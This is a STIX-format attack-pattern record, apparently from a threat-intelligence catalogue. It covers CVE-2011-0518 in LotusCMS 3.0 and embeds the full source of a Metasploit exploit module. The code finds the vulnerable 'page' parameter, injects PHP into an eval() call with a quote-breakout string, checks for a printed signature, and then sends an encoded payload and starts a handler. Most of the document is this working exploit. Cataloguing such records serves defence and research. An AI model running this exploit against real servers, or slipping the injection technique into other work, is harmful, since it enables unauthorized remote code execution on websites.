{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c7d69bac-8943-45e4-828a-49ee5c1dc9bb",
    "created": "2024-08-14T17:07:52.20834Z",
    "modified": "2024-08-14T17:07:52.208344Z",
    "name": "LotusCMS 3.0 eval() Remote Command Execution",
    "description": " This module exploits a vulnerability found in Lotus CMS 3.0's Router() function.  This is done by embedding PHP code in the 'page' parameter which will be passed to a eval call, therefore allowing remote code execution.  The module can either automatically pick up a 'page' parameter from the default page, or manually specify one in the URI option.  To use the automatic method, please supply the URI with just a directory path, for example: \"/lcms/\". To manually configure one, you may do: \"/lcms/somepath/index.php?page=index\"  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/lcms_php_exec.rb",
            "external_id": "lcms_php_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0518"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20110322161808/http://secunia.com:80/secunia_research/2011-21"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanUniqueQuery\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'LotusCMS 3.0 eval() Remote Command Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability found in Lotus CMS 3.0's Router()\n        function.  This is done by embedding PHP code in the 'page' parameter,\n        which will be passed to a eval call, therefore allowing remote code execution.\n\n          The module can either automatically pick up a 'page' parameter from the\n        default page, or manually specify one in the URI option.  To use the automatic\n        method, please supply the URI with just a directory path, for example: \"/lcms/\".\n        To manually configure one, you may do: \"/lcms/somepath/index.php?page=index\"\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'dflah_ <dflah_[at]alligatorteam.org>',\n          'sherl0ck_ <sherl0ck_[at]alligatorteam.org>',\n          'sinn3r'  #Metasploit-fu\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-0518' ],\n          [ 'OSVDB', '75095' ],\n          [ 'URL', 'http://web.archive.org/web/20110322161808/http://secunia.com:80/secunia_research/2011-21' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 4000, # only to prevent error HTTP 414 (Request-URI Too Long)\n          'DisableNops' => true,\n          'BadChars'    => \"#\",\n          'Keys'        => ['php']\n        },\n      'Platform'        => [ 'php' ],\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [[ 'Automatic LotusCMS 3.0', { }]],\n      'Privileged'      => false,\n      'DisclosureDate'  => '2011-03-03',\n      'DefaultTarget'   => 0))\n\n    register_options(\n    [\n      OptString.new('URI', [true, 'URI', '/lcms/'])\n    ])\n  end\n\n  def target_url\n    uri = normalize_uri(datastore['URI'])\n\n    # Extract two things:\n    # 1. The file path (/index.php), including the base\n    # 2. GET parameters from the GET query\n    uri   = uri.scan(/^(\\/.+)\\/(\\w+\\.php)*\\?*(\\w+=.+&*)*$/).flatten\n    base  = (uri[0] || \"\") + '/'\n    fname = uri[1] || \"\"\n    query = uri[2] || \"\"\n    params = queryparse(query) rescue \"\"\n\n    # Use the user-supplied query if there's one, if not we'll auto-detect\n    # by regexing a hyper-link\n    if base.empty? or fname.empty? or params.empty?\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri'    => normalize_uri(datastore['URI'])\n      }, 20)\n\n      if res and res.code == 200\n        uri = res.body.scan(/<a.*href=['|\"](\\/*index\\.php)\\?.*(page=\\w+)['|\"].*>/).flatten\n        @uri = base + uri[0]\n        @arg = uri[1]\n        print_status(\"Using found page param: #{@uri}?#{@arg}\")\n      else\n        @uri = \"\"\n        @arg = \"\"\n      end\n    else\n      @uri = base + fname\n      @arg = \"page=#{params['page']}\"\n    end\n  end\n\n  def check\n    target_url\n    if @uri.empty? or @arg.empty?\n      vprint_error(\"Unable to get the page parameter, please reconfigure URI\")\n      return\n    end\n\n    signature = rand_text_alpha(rand(10)+10)\n    stub = \"${print('#{signature}')};\"\n    sploit = \"');#{stub}#\"\n    response = send_request_cgi(\n    {\n      'method'  => 'POST',\n      'uri' =>  @uri,\n      'data' => @arg + Rex::Text.uri_encode(sploit)\n    }, 20)\n\n    if response and response.body =~ /#{signature}/\n      vprint_status(\"Signature: #{signature}\")\n      return Exploit::CheckCode::Vulnerable\n    else\n      vprint_error(\"Signature was not detected\")\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    return if not check == Exploit::CheckCode::Vulnerable\n\n    begin\n      sploit = \"');#{payload.encoded}#\"\n      print_status(\"Sending exploit ...\")\n      res = send_request_cgi(\n      {\n        'method'  => 'POST',\n        'uri' =>  @uri,\n        'data' => @arg + Rex::Text.uri_encode(sploit)\n      }, 20)\n      handler\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-03",
    "x_mitre_platforms": [
        "[ 'php' ]"
    ]
}